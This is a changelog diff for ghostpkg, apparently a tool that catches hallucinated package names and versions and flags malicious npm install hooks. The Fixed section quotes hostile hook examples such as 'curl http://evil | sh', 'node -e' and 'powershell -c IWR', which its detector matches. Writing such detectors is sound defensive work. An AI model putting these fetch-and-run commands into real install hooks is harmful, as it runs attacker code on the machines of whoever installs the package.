@@ -6,6 +6,45 @@ this project uses [Semantic Versioning](https://semver.org/spec/v2.0.0.html).
 
 ## [Unreleased]
 
+## [0.8.0] - 2026-09-01
+
+### Added
+- **Pinned versions are checked.** `requests==99.99.99` used to come back "ok"
+  because only the name was looked up. A version a model invented is the same
+  class of mistake as a name it invented, and just as precise to check: the
+  registry response already lists every real version, so this costs nothing
+  extra. Only exact pins are checked -- `==1.2.3` on PyPI, a bare `1.2.3` on
+  npm. Ranges like `>=2.31` or `^4.18.0` may be satisfied by some other
+  version, so there is nothing definite to say about them.
+- `ghostpkg check requests==2.31.0` accepts a pin on the command line too.
+
+### Fixed
+- **`--deep` missed essentially every realistic malicious npm hook.** The
+  patterns were written for Python and JavaScript *source*, but npm install
+  hooks are *shell commands*. `curl http://evil | sh` carries no `curl -` flag
+  to match, `node -e` is not `eval(`, and `powershell -c IWR` looks nothing
+  like `urllib.request`. All six shapes now match, and nine ordinary hooks
+  (`tsc`, `node-gyp rebuild`, `husky install`, …) stay clean.
+- **`"postinstall": "node install.js"` is now followed.** It is the commonest
+  shape of all, and the code that matters is in the file it names, which was
+  never read.
+- **`--deep` no longer passes a package it could not inspect.** A package with
+  no source archive, or one larger than the size limit, was silently treated
+  like a clean result -- so padding an archive was a way to switch `--deep` off
+  from the outside. It now says so and warns.
+- **A negative result is never cached.** Caching it for an hour seemed safe
+  until a real case appeared: PyPI's RSS announces a package a moment before
+  its JSON API serves it, so a lookup 404s, and a legitimately published
+  package was then reported as non-existent for the rest of the hour. A stale
+  block is the worst failure this tool has. Positive results are still cached.
+- **The reported nearest name is deterministic.** Iterating a frozenset has no
+  defined order, so `cjson` came back as `ujson` or `ijson` depending on
+  `PYTHONHASHSEED`.
+
+### Changed
+- The parser now carries each dependency's version specifier and line number
+  rather than the bare name.
+
 ## [0.7.0] - 2026-09-01
 
 A correctness release. Several of these were **silent** failures -- the tool
@@ -244,7 +283,8 @@ First release.
 - No corpus of hallucinated package names is shipped, following the decision of
   the USENIX'25 authors not to publish theirs.
 
-[Unreleased]: https://github.com/M1rwana12/ghostpkg/compare/v0.7.0...HEAD
+[Unreleased]: https://github.com/M1rwana12/ghostpkg/compare/v0.8.0...HEAD
+[0.8.0]: https://github.com/M1rwana12/ghostpkg/releases/tag/v0.8.0
 [0.7.0]: https://github.com/M1rwana12/ghostpkg/releases/tag/v0.7.0
 [0.6.0]: https://github.com/M1rwana12/ghostpkg/releases/tag/v0.6.0
 [0.5.0]: https://github.com/M1rwana12/ghostpkg/releases/tag/v0.5.0
